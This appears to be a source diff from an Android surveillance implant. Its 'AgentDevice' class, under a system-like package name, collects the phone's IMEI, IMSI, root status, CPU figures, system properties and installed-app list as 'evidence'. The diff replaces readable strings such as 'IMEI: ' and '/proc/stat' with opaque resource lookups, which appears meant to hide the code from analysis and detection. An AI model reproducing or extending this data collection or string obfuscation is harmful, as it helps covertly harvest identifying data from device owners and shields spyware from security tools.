@@ -24,6 +24,7 @@ import android.graphics.drawable.Drawable;
 
 import com.android.service.Device;
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
@@ -41,7 +42,7 @@ import com.android.service.util.WChar;
 public class AgentDevice extends AgentBase {
 
 	/** The Constant TAG. */
-	private static final String TAG = "AgentDevice";
+	private static final String TAG = "AgentDevice"; //$NON-NLS-1$
 
 	/** The process list. */
 	private int processList;
@@ -60,7 +61,7 @@ public class AgentDevice extends AgentBase {
 	 */
 	public AgentDevice() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " DeviceAgent constructor");
+			Check.log(TAG + " DeviceAgent constructor") ;//$NON-NLS-1$
 		}
 	}
 
@@ -97,7 +98,7 @@ public class AgentDevice extends AgentBase {
 
 		// OS Version etc...
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " Android");
+			Check.log(TAG + " Android") ;//$NON-NLS-1$
 		}
 
 		final Runtime runtime = Runtime.getRuntime();
@@ -106,37 +107,37 @@ public class AgentDevice extends AgentBase {
 
 		final StringBuffer sb = new StringBuffer();
 		if (Cfg.DEBUG) {
-			sb.append("Debug\n");
-			final String timestamp = System.getProperty("build.timestamp");
+			sb.append("Debug\n"); //$NON-NLS-1$
+			final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
 			if (timestamp != null) {
-				sb.append(timestamp + "\n");
+				sb.append(timestamp + "\n"); //$NON-NLS-1$
 			}
 		}
-		sb.append("-- SYSTEM --\r\n");
-		sb.append("IMEI: " + Device.self().getImei() + "\n");
+		sb.append(Messages.getString("9.3")+"\n"); //$NON-NLS-1$
+		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append("IMSI: SIM not present\n");
+			sb.append(Messages.getString("9.6")+"\n"); //$NON-NLS-1$
 		} else {
-			sb.append("IMSI: " + Device.self().getImsi() + "\n");
+			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		sb.append("cpuUsage: " + cpuUsage + "\n");
-		sb.append("cpuTotal: " + cpuTotal + "\n");
-		sb.append("cpuIdle: " + cpuIdle + "\n");
+		sb.append(Messages.getString("9.9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Status.self().haveRoot()) {
-			sb.append("root: yes\n");
+			sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
 		} else {
-			sb.append("root: no\n");
+			sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
 		}
 
-		sb.append("-- PROPERTIES --\r\n");
+		sb.append(Messages.getString("9.17")+"\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
 			final Entry<Object, Object> pairs = it.next();
-			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n");
+			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		if (processList == 1) {
@@ -148,7 +149,7 @@ public class AgentDevice extends AgentBase {
 			final int max = apps.size();
 
 			for (int i = 0; i < max; i++) {
-				sb.append(apps.get(i) + "\n");
+				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
 
 			}
 		}
@@ -178,12 +179,12 @@ public class AgentDevice extends AgentBase {
 	 */
 	private void readCpuUsage() {
 		try {
-			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream("/proc/stat")),
+			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(Messages.getString("9.21"))), //$NON-NLS-1$
 					1000);
 			final String load = reader.readLine();
 			reader.close();
 
-			final String[] toks = load.split(" ");
+			final String[] toks = load.split(" "); //$NON-NLS-1$
 
 			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
 			final long currIdle = Long.parseLong(toks[5]);
@@ -193,7 +194,7 @@ public class AgentDevice extends AgentBase {
 			this.cpuIdle = currIdle;
 		} catch (final IOException ex) {
 			if (Cfg.DEBUG) {
-				Check.log(ex);
+				Check.log(ex) ;//$NON-NLS-1$
 			}
 		}
 	}
@@ -214,13 +215,13 @@ public class AgentDevice extends AgentBase {
 	class PInfo {
 
 		/** The appname. */
-		private String appname = "";
+		private String appname = ""; //$NON-NLS-1$
 
 		/** The pname. */
-		private String pname = "";
+		private String pname = ""; //$NON-NLS-1$
 
 		/** The version name. */
-		private String versionName = "";
+		private String versionName = ""; //$NON-NLS-1$
 
 		/** The version code. */
 		private int versionCode = 0;
@@ -235,7 +236,7 @@ public class AgentDevice extends AgentBase {
 		 */
 		@Override
 		public String toString() {
-			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode;
+			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 		}
 
 	}
@@ -254,7 +255,7 @@ public class AgentDevice extends AgentBase {
 		final int max = apps.size();
 		for (int i = 0; i < max; i++) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: " + apps.get(i).toString());
+				Check.log(TAG + " Info: " + apps.get(i).toString()) ;//$NON-NLS-1$
 			}
 		}
 		return apps;
